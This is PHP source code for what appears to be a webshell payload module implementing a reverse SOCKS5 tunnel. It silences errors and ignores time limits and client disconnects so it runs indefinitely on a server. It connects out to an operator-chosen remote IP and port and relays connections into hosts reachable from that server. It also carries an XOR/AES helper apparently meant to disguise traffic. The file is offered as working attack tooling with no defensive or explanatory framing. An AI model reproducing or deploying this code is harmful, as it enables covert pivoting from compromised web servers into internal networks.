
function main($action,$remoteIP,$remotePort)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
	@error_reporting(0);

	$result = array();
if ($action=="create")
{
 @session_start();
 					$_SESSION["socks_running"] = true;
 					session_write_close();
 					ob_end_clean();
                                    header("Connection: close");
                                    ignore_user_abort();
                                    ob_start();
                                    $size = ob_get_length();
                                    header("Content-Length: $size");
                                    ob_end_flush();
                                    flush();
}
else if ($action=="stop")
{
     @session_start();
     					$_SESSION["socks_running"] = false;
     					session_write_close();
     					return;
}
global $read,$outers,$targets;
$ready=false;
$outers = [];
$targets = [];
$read=[];
$write = [];
$exp = [];

$read = array_merge($targets,$outers);
while ($_SESSION["socks_running"]) {
	if ($ready==false)
	{
		$outterSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		socket_connect($outterSocket, $remoteIP, intval($remotePort));
		$outers[$outterSocket]=$outterSocket;
		$ready=true;
	}
	$read=[];
	$read = array_merge($targets,$outers);

	if (socket_select($read, $write, $exp, null) > 0) {
		foreach ($read as $socket_item) {
			if (in_array($socket_item, $outers))
			{
				if (isset($targets[$socket_item])) {
					$content = socket_read($socket_item, 2048);
					if (strlen($content)==0)
					{
						unset($outers[$socket_item]);
						continue;
					}
					socket_write($targets[$socket_item], $content, strlen($content));
				} else {
					$ready = false;
					if (handleSocks($socket_item)) {
					} else {
					}
				}
			}
			if (in_array($socket_item, $targets))
			{
				foreach ($targets as $k => $v) {
					if ($socket_item==$v)
					{
						$content = socket_read($socket_item, 2048);
						if (strlen($content)==0)
						{
							unset($targets[$k]);
							continue;
						}
						socket_write($outers[$k], $content, strlen($content));

					}
				}
			}
		}
	}

	// 当select没有监听到可操作fd的时候，直接continue进入下一次循环
	else {
		continue;
	}
}
}
function handleSocks($socket)
{

	$ver = socket_read($socket, 1);
	if ($ver == "\x05") {
		return parseSocks5($socket);
	} else if ($ver == "\x04") {
		return parseSocks4($socket);
	}
	return true;
}
function parseSocks5($socket)
{
	global $read,$outers,$targets;
	$nmethods = socket_read($socket, 1);
	for ($i = 0; $i < ord($nmethods); $i++) {
		$methods = socket_read($socket, 1);
	}
	socket_write($socket, "\x05\x00", 2);
	$version = socket_read($socket, 1);
	if ($version == "\x02") {
		$version = socket_read($socket, 1);
		$cmd = socket_read($socket, 1);
		$rsv = socket_read($socket, 1);
		$atyp = socket_read($socket, 1);
	} else {
		$cmd = socket_read($socket, 1);
		$rsv = socket_read($socket, 1);
		$atyp = socket_read($socket, 1);
	}
	if ($atyp == "\x01") {
		$target = socket_read($socket, 4);
		$targetPort = socket_read($socket, 2);
		$host = inet_ntop($target);
	} else if ($atyp == "\x03") {
		$targetLen = socket_read($socket, 1);
		$target = socket_read($socket, $targetLen);
		$targetPort = socket_read($socket, 2);
		$host = $target;
	} else if ($atyp == "\x04") {
		$target = socket_read($socket, 16);
		$targetPort = socket_read($socket, 2);
		$host = $target;
	}
	//$port=(ord($port[0]) & 0xff) * 256 + (ord($port[1]) & 0xff);
	$port = unpack("n", $targetPort)[1];
	if ($cmd == "\x02" || $cmd == "\x03") {
		throw new Exception("not implemented");
	} else if ($cmd == "\x01") {
		$host = gethostbyname($host);
		try {

			$targetSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
			socket_connect($targetSocket, $host, $port);
			$targets[$socket]=$targetSocket;
			$read[]=$targetSocket;

			socket_write($socket, "\x05\x00\x00\x01" . packAddr($host, $port));
			return true;
		} catch (Exception $e) {
			socket_write($socket, "\x05\x05\x00\x01");
			throw new Exception(sprintf("[%s:%d] Remote failed", $host, $port));
		}
	} else {
		throw new Exception("Socks5 - Unknown CMD");
	}
}
function parseSocks4($socket)
{
	return false;
}
function packAddr($host, $port)
{
	$tmp = explode('.', $host);
	foreach ($tmp as $block) {
		$data .= chr($block);
	}
	$data .= pack("n", $port);
	return $data;
}
function encrypt($data,$key)
{
	if(!extension_loaded('openssl'))
    	{
    		for($i=0;$i<strlen($data);$i++) {
    			 $data[$i] = $data[$i]^$key[$i+1&15];
    			}
			return $data;
    	}
    else
    	{
    		return openssl_encrypt($data, "AES128", $key);
    	}
}